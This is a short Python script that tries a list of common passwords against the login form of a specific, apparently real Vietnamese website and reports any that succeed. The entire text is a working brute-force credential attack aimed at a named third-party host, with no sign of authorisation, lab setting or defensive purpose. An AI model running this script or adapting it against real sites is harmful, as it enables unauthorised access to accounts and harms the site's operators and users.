import requests
pwlist = ['demo', '123', '1234', '123456', 'test', 'demo1', 'demo123', '123demo']
url = 'http://tqk.itps.com.vn/demo.php'
for password in pwlist:
  payload = {'email':'test@demo.brute', 'password':password}
  req = requests.post(url, data=payload)
  if('talent' in req.text):
    print('Password found:', password)